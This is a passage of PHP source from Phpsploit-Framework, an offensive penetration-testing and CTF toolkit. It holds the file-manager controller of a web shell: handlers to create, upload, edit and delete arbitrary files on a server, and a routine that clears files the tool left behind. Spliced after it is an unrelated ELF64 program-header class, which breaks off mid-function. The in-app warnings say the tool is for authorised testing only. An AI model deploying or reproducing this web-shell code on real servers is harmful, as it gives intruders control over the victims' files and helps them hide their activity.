                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "create"   => array (
                    "current_directory_path" => $_current_directory_path ,
                    "data_type"              => $_data_type ,
                ) ,
                "upload"   => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "clear"    => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
            );
            $_form        = array (
                "action"    => "/file/create" ,
                "inputs"    => array (
                    array (
                        "title"    => "current directory : " ,
                        "describe" => "current directory path" ,
                        "name"     => "current_directory_path" ,
                        "value"    => $_current_directory_path ,
                    ) ,
                    array (
                        "title"    => "file name : " ,
                        "describe" => "file name" ,
                        "name"     => "file_name" ,
                        "value"    => $_file_name ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "title"   => "data type : " ,
                        "name"    => "data_type" ,
                        "options" => array (
                            array ( "describe" => "text data" , "title" => "Text Data Format" , "value" => Class_Base_Format::TYPE_DATA_TEXT , "selected" => ( ( $_data_type == Class_Base_Format::TYPE_DATA_TEXT ) ? "selected" : "" ) ) ,
                            array ( "describe" => "bin data" , "title" => "Binary Data Format" , "value" => Class_Base_Format::TYPE_DATA_BIN , "selected" => ( ( $_data_type == Class_Base_Format::TYPE_DATA_BIN ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "title" => "file content : " ,
                        "name"  => "file_content" ,
                        "value" => $_file_content ,
                    ) ,
                ) ,
            );
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Create File</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is used to create files of the specified type using the specified content format. Currently, the supported content formats are divided into text format and binary format (binary format is encoded using the "\x<0~f><0- f>" format, with a value range of 0x00~ 0xff).</div>';
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_File_Menu ::menu ( $_menu_params ) ,
                "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , ( $_content ) );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function show_upload ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( is_cli () ) {
            throw new \Exception( "The current method of the controller cannot be run in a command line environment!" , 0 );
        }
        $_current_directory_path  = Class_Base_Request ::form ( "current_directory_path" , Class_Base_Request::TYPE_STRING , "" );
        $_file_upload_count_index = 0;
        $_file_upload_count_limit = 10;
        $_file_objects            = array ();
        foreach ( $_FILES as $key => $item ) {
            $_file_object = Class_Base_File ::upload ( $key , $_current_directory_path , Class_Base_File::SIZE_FILE_CONTENT_LIMIT , Class_Base_File ::get_file_type_all () );
            if ( ! empty( $_file_object ) ) {
                $_file_objects[ $key ] = $_file_object;
                $_file_upload_count_index ++;
                if ( $_file_upload_count_index >= $_file_upload_count_limit ) {
                    break;
                }
            }
        }
        if ( ( ! empty( $_file_objects ) ) ) {
            $_file_objects_size = count ( $_file_objects );
            if ( $_file_objects_size == 1 ) {
                foreach ( $_file_objects as $key => $file_object ) {
                    if ( ( is_object ( $file_object ) ) && ( $file_object instanceof Class_Base_File ) && ( property_exists ( $file_object , "exist" ) ) && ( ! empty( $file_object -> exist ) ) ) {
                        Class_Base_Response ::redirect ( "/file/detail" , array ( "file_path" => $file_object -> path ) );
                        return null;
                    }
                }
            }
            foreach ( $_file_objects as $key => $file_object ) {
                if ( ( is_object ( $file_object ) ) && ( $file_object instanceof Class_Base_File ) && ( property_exists ( $file_object , "exist" ) ) && ( ! empty( $file_object -> exist ) ) ) {
                    Class_Base_Response ::outputln ( '<div style="padding: 32px;width:100%;text-align: center;"><a href="' . Class_Base_Response ::get_url ( "/file?detail" , array ( "file_path" => $file_object -> path ) ) . '">' . $file_object -> path . '</a></div>' );
                }
            }
            return null;
        }
        $_menu_params = array (
            "search"   => array (
                "file_name"              => "" ,
                "current_directory_path" => $_current_directory_path ,
            ) ,
            "explorer" => array (
                "current_directory_path" => $_current_directory_path ,
            ) ,
            "create"   => array (
                "current_directory_path" => $_current_directory_path ,
                "data_type"              => Class_Base_Format::TYPE_DATA_TEXT ,
            ) ,
            "upload"   => array (
                "current_directory_path" => $_current_directory_path ,
            ) ,
            "clear"    => array (
                "file_name"              => "" ,
                "current_directory_path" => $_current_directory_path ,
            ) ,
        );
        $_form        = array (
            "action"  => "/file/upload" ,
            "enctype" => "multipart/form-data" ,
            "inputs"  => array (
                array (
                    "title"    => "current directory : " ,
                    "describe" => "current directory path" ,
                    "name"     => "current_directory_path" ,
                    "value"    => $_current_directory_path ,
                ) ,
            ) ,
            "files"   => array (
                array (
                    "title"    => "upload file : " ,
                    "describe" => "upload file" ,
                    "name"     => "file_1" ,
                    "value"    => "" ,
                ) ,
            ) ,
        );
        $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Upload File</div>';
        $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is used to upload specified files to the specified directory. Warning: Uploading inappropriate files to the server may pose a security risk. Inappropriate files include executable files in binary format, script command files in text format, etc.You should be fully aware that uploading inappropriate files to the server space can cause various terrifying risk consequences!This includes but is not limited to server space, operating system, functional abnormalities in applications, software crashes, data corruption, loss or leakage, and other situations!Before uploading files, you should be fully aware that your improper behavior may bring legal risks and consequences to yourself! This module function must be used with caution.It can only be used for legally authorized penetration testing and security audit activities.The written contract you sign with the authorized party should clearly indicate that the authorized party allows you to upload files and other related operations, and specify the types of files that can be uploaded.You must strictly abide by the contract content signed between you and the authorized party, and conduct safe, reasonable, and moderate file upload behavior according to the contract content.</div>';
        $_top         = Class_View_Top ::top ();
        $_body        = array (
            "menu"    => Class_View_File_Menu ::menu ( $_menu_params ) ,
            "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
        );
        $_bottom_menu = array (
            array (
                "title"    => "" ,
                "describe" => "" ,
                "href"     => "#" ,
            ) ,
        );
        $_content     = '<div></div>';
        $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
        Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        return null;
    }

    public static function show_edit ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_debug        = Class_Base_Request ::form ( "debug" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_data_type    = Class_Base_Request ::form ( "data_type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Request::TYPE_DATA_BIN );
        $_file_content = Class_Base_Request ::form ( "file_content" , Class_Base_Request::TYPE_STRING , "" );
        $_file_path    = Class_Base_Request ::form ( "file_path" , Class_Base_Request::TYPE_STRING , "" );
        if ( file_exists ( $_file_path ) && is_file ( $_file_path ) && ( Class_Base_File ::is_permission ( $_file_path ) ) ) {
            if ( strlen ( $_file_content ) > 0 ) {
                $_file_content_update_size_limit = Class_Base_File::SIZE_FILE_CONTENT_LIMIT;
                $_file_info                      = Class_Operate_File ::update_file ( $_file_path , $_file_content , $_data_type , $_file_content_update_size_limit , $_debug );
                if ( ! empty( $_file_info ) ) {
                    Class_Base_Response ::redirect ( "/file/detail" , array ( "file_path" => $_file_info[ "file_path" ] ) );
                }
                return null;
            }
            $_limit_read_size               = Class_Base_File::SIZE_FILE_CONTENT_LIMIT;
            $_current_directory_path        = dirname ( $_file_path );
            $_file_name                     = basename ( $_file_path );
            $_file_size                     = Class_Base_File ::get_file_size ( $_file_path );
            $_file_content_remain_read_size = 0;
            $_file_content                  = Class_Base_File ::get_file_content ( $_file_path , $_data_type , $_file_content_remain_read_size , $_limit_read_size );
            $_file_content_read_size        = Class_Base_File ::get_file_content_size ( $_file_content , $_data_type );
            if ( ! is_cli () ) {
                $_menu_params = array (
                    "search"   => array (
                        "file_name"              => "" ,
                        "current_directory_path" => $_current_directory_path ,
                    ) ,
                    "explorer" => array (
                        "current_directory_path" => $_current_directory_path ,
                    ) ,
                    "create"   => array (
                        "current_directory_path" => $_current_directory_path ,
                        "data_type"              => $_data_type ,
                    ) ,
                    "upload"   => array (
                        "current_directory_path" => $_current_directory_path ,
                    ) ,
                    "clear"    => array (
                        "file_name"              => "" ,
                        "current_directory_path" => $_current_directory_path ,
                    ) ,
                );
                $_form        = array (
                    "action"    => "/file/edit" ,
                    "hiddens"   => array (
                        array (
                            "name"  => "data_type" ,
                            "value" => $_data_type ,
                        ) ,
                        array (
                            "name"  => "file_path" ,
                            "value" => $_file_path ,
                        ) ,
                    ) ,
                    "inputs"    => array (
                        array (
                            "title"    => "current directory : " ,
                            "describe" => "current directory path" ,
                            "name"     => "current_directory_path" ,
                            "value"    => $_current_directory_path ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "edit file name : " ,
                            "describe" => "edit file name" ,
                            "name"     => "edit_file_name" ,
                            "value"    => $_file_name ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "file content size : " ,
                            "describe" => "file content size" ,
                            "name"     => "file_content_size" ,
                            "value"    => ( $_file_size . " byte" ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "file content read size : " ,
                            "describe" => "file content read size" ,
                            "name"     => "file_content_read_size" ,
                            "value"    => ( $_file_content_read_size . " byte" ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "file content remain read size : " ,
                            "describe" => "file content remain read size" ,
                            "name"     => "file_content_remain_read_size" ,
                            "value"    => ( $_file_content_remain_read_size . " byte" ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "file editing permissions : " ,
                            "describe" => "file editing permissions" ,
                            "name"     => "file_editing_permissions" ,
                            "value"    => ( ( $_file_size > $_limit_read_size ) ? "prohibit" : "allow" ) ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "selects"   => array (
                        array (
                            "title"    => "data type : " ,
                            "name"     => "edit_data_type" ,
                            "options"  => array (
                                array ( "describe" => "text data" , "title" => "text data" , "value" => Class_Base_Format::TYPE_DATA_TEXT , "selected" => ( ( $_data_type == Class_Base_Format::TYPE_DATA_TEXT ) ? "selected" : "" ) ) ,
                                array ( "describe" => "bin data" , "title" => "bin data" , "value" => Class_Base_Format::TYPE_DATA_BIN , "selected" => ( ( $_data_type == Class_Base_Format::TYPE_DATA_BIN ) ? "selected" : "" ) ) ,
                            ) ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "title"    => "file data : " ,
                            "name"     => "file_content" ,
                            "value"    => $_file_content ,
                            "disabled" => ( ( $_file_size > $_limit_read_size ) ? "disabled" : "" ) ,
                        ) ,
                    ) ,
                );
                $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Edit File</div>';
                $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">Attention!When editing files, pay attention to the differences in display content formats!There is a clear difference between pure text format and binary content format in terms of saving and processing after editing!Inappropriate content format changes may result in the loss or damage of the target content!When you choose to save the file content in plain text format, the Phpsploit Framework software will save it in text content format.When you choose to save the file content in binary content format, the Phpsploit Framework software will save it in binary format.Warning: When editing the content of a binary file, you should choose to save it in binary mode instead of in plain text mode.</div>';
                $_top         = Class_View_Top ::top ();
                $_body        = array (
                    "menu"    => Class_View_File_Menu ::menu ( $_menu_params ) ,
                    "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
                );
                $_bottom_menu = array (
                    array (
                        "title"    => 'Switch data editing format to ' . ( ( $_data_type == Class_Base_File::TYPE_DATA_TEXT ) ? "Binary Data Format" : "Text Data Format" ) ,
                        "describe" => 'Switch data editing format to ' . ( ( $_data_type == Class_Base_File::TYPE_DATA_TEXT ) ? "Binary Data Format" : "Text Data Format" ) ,
                        "href"     => ( Class_Base_Response ::get_url ( "/file/edit" , array ( 'file_path' => $_file_path , "data_type" => ( $_data_type == Class_Base_File::TYPE_DATA_TEXT ) ? Class_Base_File::TYPE_DATA_BIN : Class_Base_File::TYPE_DATA_TEXT ) ) ) ,
                    ) ,
                );
                $_content     = '<div style="margin-top:64px;"></div>';
                $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
                Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
            }
        }

        return null;
    }

    public static function show_delete ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_debug                    = Class_Base_Request ::form ( "debug" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_file_path                = Class_Base_Request ::form ( "file_path" , Class_Base_Request::TYPE_STRING , "" );
        $_file_content_read_offset = Class_Base_Request ::form ( "file_content_read_offset" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_file_info                = Class_Operate_File ::get_file_info ( $_file_path , $_file_content_read_offset );
        $_deleted                  = Class_Base_Request ::form ( "deleted" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_current_directory_path   = Class_Base_File ::parent_directory ( $_file_path );
        $_file_name                = Class_Base_File ::get_file_name ( $_file_path );
        if ( ( strlen ( $_file_path ) > 0 ) && ( ! empty( $_deleted ) ) && Class_Base_File ::is_permission ( $_file_path ) ) {
            $_file_info = Class_Operate_File ::delete_file ( $_file_path , ( Class_Base_File::SIZE_FILE_CONTENT_LIMIT * 10 ) , $_debug );
            if ( ! empty( $_file_info ) ) {
                if ( ! is_cli () ) {
                    Class_Base_Response ::outputln ( '<div style="height:64px;"></div>' );
                    Class_Base_Response ::output_link_label ( Class_Base_Response ::get_url ( "/file/explorer" , array ( "current_directory_path" => $_current_directory_path ) ) , "jmp_to_explorer_parent_directory" , ( 'Successfully deleted file ( ' . $_file_path . ' ) ! Return To Current Directory : ' . $_current_directory_path ) , ( 'Return To Current Directory : ' . $_current_directory_path ) );
                } else {
                    Class_Base_Response ::outputln ( $_file_info );
                }
                return null;
            }
        }
        if ( ( ! file_exists ( $_file_path ) ) || ( ! is_file ( $_file_path ) ) ) {
            Class_Base_Response ::redirect ( "/file/explorer" , array ( "current_directory_path" => dirname ( $_file_path ) ) );
            return null;
        }
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Delete File</div>';
            $_form_result = '<div style="width:100%;padding-top: 16px;padding-bottom: 32px;"><div style="text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">';
            $_form_result .= 'The following shows the relevant information of the current file, including file path, file type, file size, file access permissions, user group to which the file belongs, user to whom the file belongs, last access time, last modification time of the file, inode information of the file, and last modification time of the inode of the file.';
            $_form_result .= '</div></div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size: 18px;">';
            $_form_result .= empty( $_file_path ) ? '' : 'file path : ' . $_file_path;
            $_form_result .= '</div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file type : ' . $_file_info[ "type" ] . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file size : ' . $_file_info[ "size" ] . ' byte</div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file perms : ' . $_file_info[ "perms" ] . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file group : ' . ( ( ! empty( $_file_info[ "group" ] ) ) ? ( "name : " . $_file_info[ "group" ][ "name" ] . " , gid : " . $_file_info[ "group" ][ "gid" ] ) : "" ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file owner : ' . ( ( ! empty( $_file_info[ "owner" ] ) ) ? ( "name : " . $_file_info[ "owner" ][ "name" ] . " , uid : " . $_file_info[ "owner" ][ "gid" ] ) : "" ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file atime : ' . date ( 'Y-m-d H:i:s' , $_file_info[ "atime" ] ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file mtime : ' . date ( 'Y-m-d H:i:s' , $_file_info[ "mtime" ] ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file inode : ' . $_file_info[ "inode" ] . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file ctime : ' . date ( 'Y-m-d H:i:s' , $_file_info[ "ctime" ] ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">read limit : ' . $_file_info[ "content_read_limit" ] . ' byte </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">read offset : ' . $_file_info[ "content_read_offset" ] . '  </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">next offset : ' . $_file_info[ "content_read_next_offset" ] . '  </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">read remain : ' . ( ( $_file_info[ "content_read_remain" ] < 0 ) ? 0 : $_file_info[ "content_read_remain" ] ) . ' byte </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">data size : ' . $_file_info[ "content_size" ] . ' byte </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">data type : ' . ( ( $_file_info[ "data_type" ] == Class_Base_File::TYPE_DATA_TEXT ) ? "Text Data Format" : "Binary Data Format" ) . ' &nbsp;&nbsp;<a href="' . ( Class_Base_Response ::get_url ( "/file/delete" , array ( 'file_path' => $_file_path , "file_content_read_offset" => $_file_info[ "content_read_next_offset" ] , "data_type" => ( ( $_file_info[ "data_type" ] == Class_Base_File::TYPE_DATA_TEXT ) ? Class_Base_File::TYPE_DATA_BIN : Class_Base_File::TYPE_DATA_TEXT ) ) ) ) . '">Switch the data display format to ' . ( ( $_file_info[ "data_type" ] == Class_Base_File::TYPE_DATA_TEXT ) ? "Binary Data Format" : "Text Data Format" ) . '</a>  </div>';
            $_form_result .= '<div style="padding-top:12px;text-align: left;font-size:18px;">file data : ';
            $_form_result .= ( ( isset( $_file_path ) ) && ( file_exists ( $_file_path ) ) && ( is_file ( $_file_path ) ) ) ? ( Class_Base_Format ::htmlentities ( $_file_info[ "content" ] ) ) : "";
            $_form_result .= '</div></div>';
            $_form_result .= '<div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Are you sure you want to delete the current file?</div>';
            $_form_result .= '<div style="margin-top:32px;margin-bottom:16px;text-align: left;font-size: 18px;color:red;">After deleting the file, it will be difficult to recover, please operate with caution! If you are unsure whether to delete the current file, please abandon the deletion of the current file!</div>';
            $_form_result .= '<div style="width:100%;padding-top: 64px;">';
            $_form_result .= '<table style="width:100%;">';
            $_form_result .= '<tr>';
            $_form_result .= '<td colspan="4" style="text-align: left;padding-top:32px;padding-bottom: 32px;"><a style="font-size:18px;" href="' . ( ( empty( $_file_info[ "content_read_remain" ] ) ) ? "" : Class_Base_Response ::get_url ( "/file/delete" , array ( 'file_path' => $_file_path , "file_content_read_offset" => $_file_info[ "content_read_next_offset" ] ) ) ) . '">Read File Reamin Content</a></td>';
            $_form_result .= '</tr>';
            $_form_result .= '<tr>';
            $_form_result .= '<td colspan="4" style="text-align: left;padding-bottom: 32px;"><a style="font-size:18px;" href="' . ( ( is_null ( $_current_directory_path ) ) ? "" : Class_Base_Response ::get_url ( "/file/explorer" , array ( 'current_directory_path' => $_current_directory_path ) ) ) . '">Return To Current Directory : ' . ( ( ! is_null ( $_current_directory_path ) ) ? $_current_directory_path : "" ) . '</a></td>';
            $_form_result .= '</tr>';
            $_form_result .= '<tr>';
            $_form_result .= '<td style="50%;text-align: left;">' . ( ( ! Class_Base_File ::is_permission ( $_file_path ) ) ? "" : '<a style="font-size:18px;" href="' . ( Class_Base_Response ::get_url ( "/file/delete" , array ( 'file_path' => $_file_path , 'deleted' => 1 ) ) ) . '">Delete current file</a>' ) . '</td>';
            $_form_result .= '<td style="50%;text-align: left;"><a style="font-size:18px;" href="' . ( Class_Base_Response ::get_url ( "/file/detail" , array ( 'file_path' => $_file_path , ) ) ) . '">Return to View Current File</a></td>';
            $_form_result .= '</tr>';
            $_form_result .= '</table>';
            $_form_result .= '</div>';
            $_menu_params = array (
                "search"   => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "explorer" => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "create"   => array (
                    "current_directory_path" => $_current_directory_path ,
                    "data_type"              => Class_Base_Format::TYPE_DATA_TEXT ,
                ) ,
                "upload"   => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "clear"    => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_File_Menu ::menu ( $_menu_params ) ,
                "content" => ( $_form_top . $_form_result ) ,
            );
            $_bottom      = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( $_file_path , "file : " );
        }
        return null;
    }

    public static function show_clear ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_file_name              = Class_Base_Request ::form ( "file_name" , Class_Base_Request::TYPE_STRING , "" );
        $_current_directory_path = Class_Base_Request ::form ( "current_directory_path" , Class_Base_Request::TYPE_STRING , ( empty( $_SERVER[ "DOCUMENT_ROOT" ] ) ? "" : $_SERVER[ "DOCUMENT_ROOT" ] ) );
        if ( ! is_cli () ) {
            $_menu_params        = array (
                "search"   => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "explorer" => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "create"   => array (
                    "current_directory_path" => $_current_directory_path ,
                    "data_type"              => Class_Base_Format::TYPE_DATA_TEXT ,
                ) ,
                "upload"   => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "clear"    => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
            );
            $_form               = array (
                "action" => "/file/clear" ,
                "inputs" => array (
                    array (
                        "title"    => "search clear path : " ,
                        "describe" => "search clear path" ,
                        "name"     => "current_directory_path" ,
                        "value"    => $_current_directory_path ,
                    ) ,
                    array (
                        "title"    => "clear file name : " ,
                        "describe" => "clear file name" ,
                        "name"     => "file_name" ,
                        "value"    => ( ( strlen ( $_file_name ) <= 0 ) ? "phpsploit" : $_file_name ) ,
                    ) ,
                ) ,
            );
            $_form_top           = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Clear File By File Name</div>';
            $_form_top           .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">Note: For security reasons (the purpose of this software design and release is to enable ethical hackers to better conduct penetration testing and security audit activities, rather than being used by malicious saboteurs for various illegal activities), this module function can only clear relevant files directly created, uploaded, and downloaded using the Phpsploit framework software.</div>';
            $_top                = Class_View_Top ::top ();
            $_body               = array (
                "menu"    => Class_View_File_Menu ::menu ( $_menu_params ) ,
                "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu        = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_search_progress_id = "search_progress";
            $_search_errors_id   = "search_errors";
            $_search_result_id   = "search_result";
            $_content            = '<div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Progress</div><div id="' . $_search_progress_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Errors</div><div id="' . $_search_errors_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Result</div><div id="' . $_search_result_id . '" style="padding-top:16px;padding-bottom:16px;text-align: left;font-size:18px;"></div><div style="height:64px;"></div>';
            $_bottom             = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( ( $_current_directory_path != "" ) && ( $_file_name != "" ) ) {
            Class_Operate_File ::clear_file ( $_current_directory_path , $_file_name , $_search_progress_id , $_search_errors_id , $_search_result_id , 500 );
        }
        if ( ! is_cli () ) {
            Class_Base_Response ::output_div_inner_html ( $_search_progress_id , "" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 下午10:21
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Program_Header extends Class_Base
{
    const ALIAS = "Elf64_Phdr";

    const SIZE_P_TYPE   = Class_Base_Elf64::SIZE_ELF64_WORD;
    const SIZE_P_FLAGS  = Class_Base_Elf64::SIZE_ELF64_WORD;
    const SIZE_P_OFFSET = Class_Base_Elf64::SIZE_ELF64_OFF;
    const SIZE_P_VADDR  = Class_Base_Elf64::SIZE_ELF64_ADDR;
    const SIZE_P_PADDR  = Class_Base_Elf64::SIZE_ELF64_ADDR;
    const SIZE_P_FILESZ = Class_Base_Elf64::SIZE_ELF64_XWORD;
    const SIZE_P_MEMSZ  = Class_Base_Elf64::SIZE_ELF64_XWORD;
    const SIZE_P_ALIGN  = Class_Base_Elf64::SIZE_ELF64_XWORD;


    const PURPOSE_P_TYPE   = "";
    const PURPOSE_P_FLAGS  = "";
    const PURPOSE_P_OFFSET = "";
    const PURPOSE_P_VADDR  = "";
    const PURPOSE_P_PADDR  = "";
    const PURPOSE_P_FILESZ = "";
    const PURPOSE_P_MEMSZ  = "";
    const PURPOSE_P_ALIGN  = "";

    private static $_elf64_phdrs = array ();

    public $p_type   = null;
    public $p_flags  = null;
    public $p_offset = null;
    public $p_vaddr  = null;
    public $p_paddr  = null;
    public $p_filesz = null;
    public $p_memsz  = null;
    public $p_align  = null;

    public static function get_program_header_size ()
    {
        $_program_header_size = ( self::SIZE_P_TYPE + self::SIZE_P_FLAGS + self::SIZE_P_OFFSET + self::SIZE_P_VADDR + self::SIZE_P_PADDR + self::SIZE_P_FILESZ + self::SIZE_P_MEMSZ + self::SIZE_P_ALIGN );
        return $_program_header_size;
    }

    public static function get_p_type_offset ()
    {
        $_offset = ( Class_Base_Elf::OFFSET_START );
        return $_offset;
    }

    public static function get_p_flags_offset ()
    {
        $_offset = ( self::get_p_type_offset () + self::SIZE_P_TYPE );
        return $_offset;
    }

    public static function get_p_offset_offset ()
    {
        $_offset = ( self::get_p_flags_offset () + self::SIZE_P_FLAGS );
        return $_offset;
    }

    public static function get_p_vaddr_offset ()
    {
        $_offset = ( self::get_p_offset_offset () + self::SIZE_P_OFFSET );
        return $_offset;
    }

    public static function get_p_paddr_offset ()
    {
        $_offset = ( self::get_p_vaddr_offset () + self::SIZE_P_VADDR );
        return $_offset;
    }

    public static function get_p_filesz_offset ()
    {
        $_offset = ( self::get_p_paddr_offset () + self::SIZE_P_PADDR );
        return $_offset;
    }

    public static function get_p_memsz_offset ()
    {
        $_offset = ( self::get_p_filesz_offset () + self::SIZE_P_FILESZ );
        return $_offset;
    }

    public static function get_p_align_offset ()
    {
        $_offset = ( self::get_p_memsz_offset () + self::SIZE_P_MEMSZ );
        return $_offset;
    }

    public static function create_elf64_phdr ( $filepath , $p_type , $p_flags , $p_offset , $p_vaddr , $p_paddr , $p_filesz , $p_memsz , $p_align )
    {
        self::$_elf64_phdrs[ $filepath ] = $_elf64_phdr = new Class_Base_Elf64_Program_Header( $p_type , $p_flags , $p_offset , $p_vaddr , $p_paddr , $p_filesz , $p_memsz , $p_align );
        return $_elf64_phdr;
    }

    public function __construct ( $p_type , $p_flags , $p_offset , $p_vaddr , $p_paddr , $p_filesz , $p_memsz , $p_align )
    {
        $this->p_type   = $p_type;
        $this->p_flags  = $p_flags;
        $this->p_offset = $p_offset;
        $this->p_vaddr  = $p_vaddr;
        $this->p_paddr  = $p_paddr;
        $this->p_filesz = $p_filesz;
        $this->p_memsz  = $p_memsz;
        $this->p_align  = $p_align;
    }

    public function __destruct ()
    {
        $this->p_type   = null;
        $this->p_flags  = null;
